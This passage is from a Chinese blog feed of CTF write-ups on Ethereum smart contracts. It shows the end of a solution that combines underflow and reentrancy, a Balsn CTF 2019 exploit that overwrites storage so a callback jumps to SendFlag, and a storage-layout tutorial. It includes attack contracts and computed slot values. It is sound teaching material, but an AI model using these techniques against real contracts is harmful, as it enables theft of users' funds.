class="hljs-params">contract_address</span>, <span class="hljs-params">slot4</span>)</span>))<br>print(<span class="hljs-string">&quot;storage5 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">slot5</span>)</span>))<br>print(<span class="hljs-string">&quot;storage6 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">slot6</span>)</span>))<br># slot = <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">idx</span>+1)</span>)<br># print(slot)<br># <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>):<br>#     slot = w3.eth.get<span class="hljs-constructor">StorageAt(<span class="hljs-params">contract_address</span>,<span class="hljs-params">i</span>)</span><br>#     print(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">slot</span>)</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/2fa7d02398f9aba5cb8b3cc5e04cc862.png"></p><h3 id="step1调用到重写的接口函数"><a href="#step1调用到重写的接口函数" class="headerlink" title="step1调用到重写的接口函数"></a>step1调用到重写的接口函数</h3><p>在上述分析可以知道，接口函数重写需要使两次返回结果不一样，我们让第二次返回true，所以sotrage[0x02]=true<br><img src="https://img-blog.csdnimg.cn/img_convert/426df10f7f4fc885ef2bfef27498d713.png"></p><h3 id="step2调用guess和buy函数"><a href="#step2调用guess和buy函数" class="headerlink" title="step2调用guess和buy函数"></a>step2调用guess和buy函数</h3><p>可以看到调用完,storage[0x00]相比调用前高位字节多了个0x01，即一个bool型变量被设置成了true。<br><img src="https://img-blog.csdnimg.cn/img_convert/8ff8d61ac9e627867f20180bcb6b8aac.png"></p><p>而在buy函数中会使storage[0x05]和storage[0x06]都+1</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5240cbd9e4194756657ed97a6233a36c.png"></p><h3 id="step3调用retract函数"><a href="#step3调用retract函数" class="headerlink" title="step3调用retract函数"></a>step3调用retract函数</h3><p>在retract函数中会进行storage[0x01]-1，而在上面可以看到storage[0x01]为0，所以会下溢出。<br><img src="https://img-blog.csdnimg.cn/img_convert/54f308278a2d719066651f8e5ec5a7d8.png"></p><p>此时storage[0x01]为0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff<br><img src="https://img-blog.csdnimg.cn/img_convert/a6085331525b96ac027e4da5a6176481.png"></p><h3 id="step4调用-retract-和-revise-修改-owner"><a href="#step4调用-retract-和-revise-修改-owner" class="headerlink" title="step4调用 retract() 和 revise() 修改 owner"></a>step4调用 retract() 和 revise() 修改 owner</h3><p>调用完storage[0x00]已经被修改<br><img src="https://img-blog.csdnimg.cn/img_convert/56209c9d13d7f04343071f4c707098dd.png"></p><h3 id="部署第三方子合约，第三方子合约调用-gift-和-transfer-给攻击合约转账"><a href="#部署第三方子合约，第三方子合约调用-gift-和-transfer-给攻击合约转账" class="headerlink" title="部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账"></a>部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账</h3><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><br>contract son &#123;<br>    <span class="hljs-built_in">address</span> instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        <span class="hljs-built_in">address</span>(instance_address).<span class="hljs-built_in">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>        // transfer<br>        <span class="hljs-built_in">address</span>(instance_address).<span class="hljs-built_in">call</span>(bytes4(<span class="hljs-number">0</span>xa9059cbb), <span class="hljs-built_in">address</span>(<span class="hljs-number">0</span>xE281b17958fc2a9dc089Cc8c13c09bE787f88111), <span class="hljs-number">100</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>转账一次+100，所以变成了0xc8即200<br><img src="https://img-blog.csdnimg.cn/img_convert/a5db58e8711a7f0e803c1fd3a5a2bebe.png"></p><h3 id="step5调用withdraw进行重入攻击"><a href="#step5调用withdraw进行重入攻击" class="headerlink" title="step5调用withdraw进行重入攻击"></a>step5调用withdraw进行重入攻击</h3><p>在这一步时我发现我在本地部署题目合约的时候没给合约里面转eth导致合约的balance为0。。。所以导致第三方合约无法调用withdraw函数。。最终换了个合约地址继续做题0x168892cb672A747F193eb4acA7b964bfb0aA6476，攻击合约为0x6959f5E401E881A35563599397E0345860742111</p><p>这里需要注意就是最开始storage[0x05]为0x02，而我们需要让它减4之后才能下溢出，所以需要将攻击账户的balance增加到400，所以总共需要部署第三方转账合约转三次，一次+100。因为我们调用witudraw进行重入攻击会改变storage[0x05]，所以只有一次机会，不然得重新来一遍。</p><p>转账给攻击合约一直到balance为400<br><img src="https://img-blog.csdnimg.cn/img_convert/fbe31e85d2454c144e2800d39591678e.png"></p><p>进行重入攻击<br><img src="https://img-blog.csdnimg.cn/img_convert/53121fccfc6a5b4ae310efb278c0c524.png"></p><p>此时storage[0x05]下溢出，就能满足调用payforflag得条件了<br><img src="https://img-blog.csdnimg.cn/img_convert/4e097c721348987cd0fa3ef6aa777cf3.png"></p><h3 id="调用payforflag"><a href="#调用payforflag" class="headerlink" title="调用payforflag"></a>调用payforflag</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/887c65a5a5d55e01ea5603908b56d641.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1a3c1c342feffbb937b06fcfbe45b024.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题前前后后做了很久很久，涉及到的知识太多了，虽然在wiki里面把这题推荐放在了介绍Ethereum Storage那一张，也是考察到了相关覆盖Storage的知识，但其它的考点也非常多，融合在一起对于入门一个月的新手讲确实很难了，而且还是个xctf决赛的题。但不得不说还是学到很多。对于重入攻击，溢出，随机数预测，以及eth下的区块链攻击模式有了更深的理解、</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ethereum Storage(2)</title>
    <link href="/2022/08/10/2022-8-10-Ethereum%20Storage(2)/"/>
    <url>/2022/08/10/2022-8-10-Ethereum%20Storage(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="Ethereum-Storage"><a href="#Ethereum-Storage" class="headerlink" title="Ethereum Storage"></a>Ethereum Storage</h1><p><a href="https://ctf-wiki.org/blockchain/ethereum/storage/#xctf_final-2019">wiki部分</a></p><h2 id="Balsn-CTF-2019"><a href="#Balsn-CTF-2019" class="headerlink" title="Balsn CTF 2019"></a>Balsn CTF 2019</h2><p>这题考察了挺多东西，Ethereum Storage的存储，局部变量未初始化导致可覆盖slot，控制程序流进行跳转有点像pwn了。下面两篇文章讲的非常之详细了。</p><p><a href="https://hitcxy.com/2020/balsn2019-bank/">参考wp</a><br><a href="http://www.ctfiot.com/37488.html">参考wp2</a></p><h3 id="合约源码"><a href="#合约源码" class="headerlink" title="合约源码"></a>合约源码</h3><p>较题目源码增加了一个read_slot函数方便读slot值和读safeboxes数组内容的函数。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">pragma solidity ^0.4.24;<br><br>contract Bank &#123;<br>    event SendEther(address addr);<br>    event SendFlag(address addr);<br>    <br>    address public owner;<br>    uint randomNumber &#x3D; 0;<br>    constructor() public payable&#123;<br>        owner &#x3D; msg.sender;<br>    &#125;<br>    <br>    struct SafeBox &#123;<br>        bool done;<br>        function(uint, bytes12) internal callback;<br>        bytes12 hash;<br>        uint value;<br>    &#125;<br>    SafeBox[] safeboxes;<br>    <br>    struct FailedAttempt &#123;<br>        uint idx;<br>        uint time;<br>        bytes12 triedPass;<br>        address origin;<br>    &#125;<br>    mapping(address &#x3D;&gt; FailedAttempt[]) failedLogs;<br>    <br>    modifier onlyPass(uint idx, bytes12 pass) &#123;<br>        if (bytes12(sha3(pass)) !&#x3D; safeboxes[idx].hash) &#123;<br>            FailedAttempt info;<br>            info.idx &#x3D; idx;<br>            info.time &#x3D; now;<br>            info.triedPass &#x3D; pass;<br>            info.origin &#x3D; tx.origin;<br>            failedLogs[msg.sender].push(info);<br>        &#125;<br>        else &#123;<br>            _;<br>        &#125;<br>    &#125;<br><br>    function deposit(bytes12 hash) payable public returns(uint) &#123;<br>        SafeBox box;<br>        box.done &#x3D; false;<br>        box.hash &#x3D; hash;<br>        box.value &#x3D; msg.value;<br>        if (msg.sender &#x3D;&#x3D; owner) &#123;<br>            box.callback &#x3D; sendFlag;<br>        &#125;<br>        else &#123;<br>            require(msg.value &gt;&#x3D; 1 ether);<br>            box.value -&#x3D; 0.01 ether;<br>            box.callback &#x3D; sendEther;<br>        &#125;<br>        safeboxes.push(box);<br>        return safeboxes.length-1;<br>    &#125;<br>    <br>    function withdraw(uint idx, bytes12 pass) public payable &#123;<br>        SafeBox box &#x3D; safeboxes[idx];<br>        require(!box.done);<br>        box.callback(idx, pass);<br>        box.done &#x3D; true;<br>    &#125;<br>    function box_info(uint i) public returns(uint,bytes32)&#123;<br>        return(safeboxes.length,safeboxes[i])<br>    &#125;<br>    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;<br>        msg.sender.transfer(safeboxes[idx].value);<br>        emit SendEther(msg.sender);<br>    &#125;<br>    <br>    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;<br>        require(msg.value &gt;&#x3D; 100000000 ether);<br>        emit SendFlag(msg.sender);<br>        selfdestruct(owner);<br>    &#125;<br>    function read_slot(uint k) public view returns (bytes32 res) &#123;<br>        assembly &#123; res :&#x3D; sload(k) &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h3><p>分析我就不写了，上面两篇wp真的非常详细。<br>主要有几个点：</p><ul><li>deposit里的 SafeBox box，对box的声明并没有指定位置和初始化，所有该结构体指针是指向slot0的，而存储owner的地方正是在slot0，可以覆盖owner，不过后面限制了<code>require(msg.value &gt;= 100000000 ether)</code>所以没啥用。</li><li>这个modifier里声明的 FailedAttempt info; 也是未指定位置和初始化的，所以也能覆盖。它能覆盖slot0-2，所以可以改safeboxes的长度。</li><li>afeboxes是一个动态数组，failedLogs 是一个映射，但他们都是存储在storage上的，所以有没有可能，他们是可以重叠的。只要safeboxes的长度比他们各自起始位置的差值的二分之一大就可以了。也就是 keccak245(msg.address()||3) -keccak256(2) &lt; safebox.length // 2 （因为一个box占俩slot）</li><li>重叠之后 failedLogs 里的 某个 info 通过修改 triedPass 就能覆盖safeboxes里某个box的callback了。直接给他跳到 emit SendFlag(msg.sender)</li></ul><p>storage具体结构<br><img src="https://img-blog.csdnimg.cn/img_convert/44917c79ccb7569385a26d653ffdda39.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/60d1379790e9912726803dc412fcd132.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/6c015c92e542ee925555367cbbdb1a61.png"><br>覆盖又有两种情况，分别如下。<br><img src="https://img-blog.csdnimg.cn/img_convert/1e3f162f818e2f00367ce211b39e6832.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/11ad88f2693b60de4424e7fddb995aa2.png"></p><h3 id="合约攻击"><a href="#合约攻击" class="headerlink" title="合约攻击"></a>合约攻击</h3><p>简单记录一下解题过程。不过题目局限于solidity&lt;0.5中<br><img src="https://img-blog.csdnimg.cn/img_convert/302c8b4b955ea953b80478b737aa2351.png"></p><ul><li>计算target = keccak256(keccak256(msg.sender||3)) + 2，这个是 failedLogs [msg.sender].”origin+tridPasss”的地方，我们要改这里[注意这里有两次keccak，一次是mapping的，一次是failedLogs[]的，实际部署的时候在这里踩坑了]<br>利用如下合约可以进行获取 slot 内容、mapping 内容对应 slot 、数组第一个元素对应 slot。</li></ul><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> = <span class="hljs-number">0</span>xb<span class="hljs-number">1</span>a<span class="hljs-number">6110</span>cd<span class="hljs-number">4944</span>e<span class="hljs-number">459</span>f<span class="hljs-number">5</span>cf<span class="hljs-number">3</span>db<span class="hljs-number">076879119</span>a<span class="hljs-number">1</span>a<span class="hljs-number">19</span>d<span class="hljs-number">3</span>b<span class="hljs-number">554</span>e<span class="hljs-number">562</span>f<span class="hljs-number">2</span>e<span class="hljs-number">2</span>cfbad<span class="hljs-number">7</span>f<span class="hljs-number">41</span>d<span class="hljs-number">06</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/2177e07c9d7d7d7e2fceebd7d2d65cf8.png"></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pragma">pragma solidity ^0.4.24;<br>contract calc&#123;<br>    function read_slot(uint k) public view returns (bytes32 res) &#123;<br>    assembly &#123; res :&#x3D; sload(k) &#125;<br>&#125;<br><br>    function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(keccak256(abi.encodePacked(k, p)));<br>    &#125;<br><br>    function calc_1(uint k, uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(abi.encodePacked(k, p));<br>    &#125;<br><br>    function cal_addr(uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(abi.encodePacked(p));<br>    &#125;<br>        function cal_uint(uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(p);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>计算base = keccak256(2)，这个是safeboxes的起始位置</li></ul><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">base</span> = <span class="hljs-number">0</span>x<span class="hljs-number">405787</span>fa<span class="hljs-number">12</span>a<span class="hljs-number">823</span>e<span class="hljs-number">0</span>f<span class="hljs-number">2</span>b<span class="hljs-number">7631</span>cc<span class="hljs-number">41</span>b<span class="hljs-number">3</span>ba<span class="hljs-number">8828</span>b<span class="hljs-number">3321</span>ca<span class="hljs-number">811111</span>fa<span class="hljs-number">75</span>cd<span class="hljs-number">3</span>aa<span class="hljs-number">3</span>bb<span class="hljs-number">5</span>ace<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/76a79f2325057cffefe8338367f8f39d.png"></p><ul><li>计算idx = (target-base)//2 (一个box占俩slot) 这个是要改的位置和safeboxes开始的位置之间能塞多少个box。</li></ul><p>这里 idx 指的是在 safeboxes 数组中的索引,因为一个 Safebox 占据两个 slot ,所以要除以 2</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">idx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">38</span>a<span class="hljs-number">7448960</span>f<span class="hljs-number">615325652</span>c<span class="hljs-number">85</span>f<span class="hljs-number">21</span>a<span class="hljs-number">69</span>eb<span class="hljs-number">48</span>bc<span class="hljs-number">77358</span>f<span class="hljs-number">569</span>ea<span class="hljs-number">287</span>c<span class="hljs-number">3681401</span>a<span class="hljs-number">1</span>c<span class="hljs-number">611</span>c<br></code></pre></div></td></tr></table></figure><ul><li>如果<code> (target-base) % 2 == 1</code>，说明不是正正好塞满整数个box，那么idx += 2，我们要用到下两个box，这个box和下一个box都改不到。如果<code>(target - base) % 2</code> ,如果等于 0 ,说明 origin(20) | triedPass(12) 刚好可以覆盖 <code>unused (11) | hash (12) | callback (8) | done (1)</code></li></ul><p>可以看到这里恰好能塞满整数个box。<br><img src="https://img-blog.csdnimg.cn/img_convert/5ea2cbe17655b15b94056722b8f43e09.png"></p><ul><li>计算<code>result = (msg.sender &lt;&lt; (12*8))</code>,如果<code>result &lt; idx</code>得换一个账户，长度无法达到覆盖的要求，因为safeboxes的长度是用tx.origin去覆盖的，最后的值会是<code>tx.origin &lt;&lt;(12*8)+Pass</code></li></ul><p>经过判断，(msg.sender &lt;&lt; (12*8))&gt;idx，符合长度要求。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">result</span> = <span class="hljs-number">0</span>x<span class="hljs-number">9</span>c<span class="hljs-number">5</span>d<span class="hljs-number">5</span>be<span class="hljs-number">2</span>a<span class="hljs-number">76503957853</span>d<span class="hljs-number">9</span>b<span class="hljs-number">6</span>f<span class="hljs-number">81</span>ffde<span class="hljs-number">226635739000000000000000000000000</span><br></code></pre></div></td></tr></table></figure><ul><li>用 1 eth 调用一下 deposit(0x000000000000000000000000)。主要是让box.callback = sendEther;然后就能通过withdraw调用sendEther函数了。</li></ul><p>调用完查看slot，可以发现第一个slot中有一个0x08E7,反编译合约查看在0x08E7有一个跳转，就是sendEther函数调用。<br><img src="https://img-blog.csdnimg.cn/img_convert/25a61df76252b57483fe6ab275e37fd5.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/3d23502d74b7f6b77247dc39a90ab4bc.png"></p><ul><li>调用 withdraw(0, 0x111111111111110000084300)，将callback函数覆盖为<code>0843</code>，再调用callback即可跳转到SendFlag哈数。如果step4中 (target-base) % 2 == 1，那么这一步执行两次</li></ul><p>0x52b7d2dcc80cd2e4000000即为100000000 eth<br><img src="https://img-blog.csdnimg.cn/img_convert/936fe5500ddde8e9497b57c202fe9eb2.png"></p><p>调用完withdraw 查看storage，发现safebox长度确实被覆盖了（值即为msg.sender + 0x111111111111110000084300）<br><img src="https://img-blog.csdnimg.cn/img_convert/400c39445bebfa747540aa3fa8b5d92c.png"></p><p>并且查看<code>slot=target</code>处的值，成功覆盖的话应该会是<code>msg.sender + 0x111111111111110000084300</code>,事实确实如此<br><img src="https://img-blog.csdnimg.cn/img_convert/a7eacdd5824852336d6d9b5b7da064f4.png"></p><ul><li>最后再调用一下withdraw(idx, 0x000000000000000000000000) 就能触发emit SendFlag(msg.sender);事件了。</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/cb7fbc580cc0eee7ec1f88a2cc9c68ad.png"></p><h2 id="XCTF-final-2019-Happy-DOuble-Eleven"><a href="#XCTF-final-2019-Happy-DOuble-Eleven" class="headerlink" title="XCTF_final 2019 Happy_DOuble_Eleven"></a>XCTF_final 2019 Happy_DOuble_Eleven</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ethereum Storage(1)</title>
    <link href="/2022/08/09/2022-8-9-Ethereum%20Storage(1)/"/>
    <url>/2022/08/09/2022-8-9-Ethereum%20Storage(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="利用web3读取storage"><a href="#利用web3读取storage" class="headerlink" title="利用web3读取storage"></a>利用web3读取storage</h1><p><a href="https://github.com/wuwe1/solidity-doc-zh/blob/main/solidity-doc-zh.md">参考文章</a><br><a href="https://zhuanlan.zhihu.com/p/341406256">参考</a><br><a href="https://ctf-wiki.org/blockchain/ethereum/storage/">wiki部分</a></p><h2 id="合约"><a href="#合约" class="headerlink" title="合约"></a>合约</h2><p>看完wiki在网上找了个简单例子。</p><p>合约如下,地址为<code>0xB70D357314CA537E275E1F5891C35026Bf61ad25</code></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sodility">pragma solidity ^0.4.0;<br><br>contract testStorage &#123;<br><br>    uint storeduint1 &#x3D; 15;<br>    uint constant constuint &#x3D; 16;<br>    uint128 investmentsLimit &#x3D; 17055;<br>    uint32 investmentsDeadlineTimeStamp &#x3D; uint32(now);<br><br>    bytes16 string1 &#x3D; &#39;test1&#39;;<br>    bytes32 string2 &#x3D; &#39;test1236&#39;;<br>    string string3 &#x3D; &#39;lets string something&#39;;<br><br>    mapping (address &#x3D;&gt; uint) uints1;<br>    mapping (address &#x3D;&gt; DeviceData) structs1;<br><br>    uint[] uintarray;<br>    DeviceData[] deviceDataArray;<br><br>    struct DeviceData &#123;<br>        string deviceBrand;<br>        string deviceYear;<br>        string batteryWearLevel;<br>    &#125;<br><br>    function testStorage() &#123;<br>        address address1 &#x3D; 0xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6;<br>        address address2 &#x3D; 0xaee905fdd3ed851e48d22059575b9f4245a82b04;<br><br>        uints1[address1] &#x3D; 88;<br>        uints1[address2] &#x3D; 99;<br><br>        var dev1 &#x3D; DeviceData(&#39;deviceBrand&#39;, &#39;deviceYear&#39;, &#39;wearLevel&#39;);<br>        var dev2 &#x3D; DeviceData(&#39;deviceBrand2&#39;, &#39;deviceYear2&#39;, &#39;wearLevel2&#39;);<br><br>        structs1[address1] &#x3D; dev1;<br>        structs1[address2] &#x3D; dev2;<br><br>        uintarray.push(8000);<br>        uintarray.push(9000);<br><br>        deviceDataArray.push(dev1);<br>        deviceDataArray.push(dev2);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这份代码里一共有10个变量，首先要注意的是，被标记为constant的变量是不会存在于storage的，他在代码中出现的地方会在编译时被编译器替换上。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">第一个变量为uint 单独占用一个slot<br>slot<span class="hljs-number"> 0 </span>0x000000000000000000000000000000000000000000000000000000000000000f<br>第二变量为constant 不会放在storage，可参考上述文章。<br><br>第三个变量uint128和第四个变量uint32会放在一个slot里面，因为如果 bytes 和 string 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。（如果一个slot就能装下的话）<br>slot<span class="hljs-number"> 1 </span>0x00000000000000000000000062f1f5880000000000000000000000000000429f<br><br>后面两个变量是bytes16和bytes32，都是直接占用一个slot（高位对齐）<br>slot<span class="hljs-number"> 2 </span>0x0000000000000000000000000000000074657374310000000000000000000000<br>slot<span class="hljs-number"> 3 </span>0x7465737431323336000000000000000000000000000000000000000000000000<br><br>然后是string变量，数据长度小于等于<span class="hljs-number"> 31 </span>字节， 则它存储在高位字节（左对齐），最低位字节存储 length * 2<br>slot<span class="hljs-number"> 4 </span>0x6c65747320737472696e6720736f6d657468696e67000000000000000000002a<br><br>然后是两个映射类型变量，都会占据一个slot但是真正的起始位置为keccak256(k . p)，这里k，p就是键和键值。<br>slot<span class="hljs-number"> 5 </span>0x0000000000000000000000000000000000000000000000000000000000000000<br>slot<span class="hljs-number"> 6 </span>0x0000000000000000000000000000000000000000000000000000000000000000<br><br>然后是一个uint256数组，对于形如 uint[] b; 的动态数组，其同样会占用对应位置 p 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 keccak256(p) 处.<br>这里由于在构造函数中先push了两个数所以长度初始就是2.<br>slot<span class="hljs-number"> 7 </span>0x0000000000000000000000000000000000000000000000000000000000000002<br><br>最后是一个结构体数组，存储方式和动态数组是一样的，无非就是每个结构体含有多个变量，所以数组里的一个索引的值会占用多个slot。<br>在构造函数中也给结构体数组push了两个元素，所以初始长度为2。<br>slot<span class="hljs-number"> 8 </span>0x0000000000000000000000000000000000000000000000000000000000000002<br><br></code></pre></div></td></tr></table></figure><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p>所以如何计算数组或者映射的起始位置呢。这里可以使用合约也可以使用web3.js或者python下的web3.</p><ul><li>使用如下合约<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">pragma solidity ^0.4.24;<br>contract calc&#123;<br>    function read_slot(uint k) public view returns (bytes32 res) &#123;<br>    assembly &#123; res :&#x3D; sload(k) &#125;<br>&#125;<br><br>    function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123;<br>        res &#x3D; keccak256(keccak256(abi.encodePacked(k, p)));<br>    